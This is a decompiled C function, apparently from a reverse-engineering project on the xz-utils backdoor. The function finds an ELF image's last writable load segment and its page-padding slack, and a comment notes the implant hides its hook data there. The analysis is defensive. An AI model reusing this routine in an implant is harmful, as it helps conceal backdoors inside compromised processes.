// /home/kali/xzre-ghidra/xzregh/102150_elf_get_data_segment.c
// Function: elf_get_data_segment @ 0x102150
// Calling convention: unknown
// Prototype: undefined elf_get_data_segment(void)


/*
 * AutoDoc: Walks every PT_LOAD segment looking for the last read/write mapping (PF_W|PF_R). Once found it caches three pieces of information: the base of the mapped data (`data_segment_start`), the amount of padding between the end of the file-backed bytes and the next page boundary (`data_segment_alignment`), and the total size of the aligned segment. Callers either request the true segment span (`get_alignment == FALSE`) or the padding region (when TRUE), which is where the implant later tucks the `backdoor_hooks_data_t` structure.
 */
#include "xzre_types.h"


ulong elf_get_data_segment(long *param_1,long *param_2,int param_3)

{
  BOOL bVar1;
  long lVar2;
  int *piVar3;
  long lVar4;
  ulong uVar5;
  ulong uVar6;
  ulong uVar7;
  ulong uVar8;
  ulong uVar9;
  
  uVar6 = param_1[0x17];
  if (uVar6 != 0) {
    if (param_3 != 0) {
      lVar2 = param_1[0x19];
      *param_2 = lVar2;
      uVar6 = uVar6 - lVar2;
      if (lVar2 == 0) {
        uVar6 = 0;
      }
      return uVar6;
    }
    *param_2 = param_1[0x18];
    return uVar6;
  }
  bVar1 = FALSE;
  lVar2 = 0;
  uVar5 = 0;
  uVar6 = 0;
  for (uVar8 = 0; (uint)uVar8 < (uint)*(ushort *)(param_1 + 3); uVar8 = uVar8 + 1) {
    piVar3 = (int *)(uVar8 * 0x38 + param_1[2]);
    if ((*piVar3 == 1) && ((piVar3[1] & 7U) == 6)) {
      if (*(ulong *)(piVar3 + 10) < *(ulong *)(piVar3 + 8)) {
        return 0;
      }
      uVar7 = (*param_1 - param_1[1]) + *(long *)(piVar3 + 4);
      uVar9 = *(ulong *)(piVar3 + 10) + uVar7;
      uVar7 = uVar7 & 0xfffffffffffff000;
      if ((uVar9 & 0xfff) != 0) {
        uVar9 = (uVar9 & 0xfffffffffffff000) + 0x1000;
      }
      if (bVar1) {
        if (uVar5 + lVar2 < uVar9) {
          lVar2 = uVar9 - uVar7;
          uVar6 = uVar8 & 0xffffffff;
          uVar5 = uVar7;
        }
      }
      else {
        lVar2 = uVar9 - uVar7;
        bVar1 = TRUE;
        uVar6 = uVar8 & 0xffffffff;
        uVar5 = uVar7;
      }
    }
  }
  if (bVar1) {
    lVar2 = uVar6 * 0x38 + param_1[2];
    lVar4 = (*param_1 - param_1[1]) + *(long *)(lVar2 + 0x10);
    uVar8 = *(long *)(lVar2 + 0x28) + lVar4;
    uVar5 = lVar4 + *(long *)(lVar2 + 0x20);
    uVar6 = uVar8;
    if ((uVar8 & 0xfff) != 0) {
      uVar6 = (uVar8 & 0xfffffffffffff000) + 0x1000;
    }
    lVar2 = uVar6 - uVar8;
    param_1[0x17] = uVar5;
    param_1[0x19] = lVar2;
    param_1[0x18] = uVar6 - uVar5;
    if (param_3 == 0) {
      *param_2 = uVar6 - uVar5;
      return uVar5;
    }
    *param_2 = lVar2;
    if (lVar2 != 0) {
      return uVar8;
    }
  }
  return 0;
}

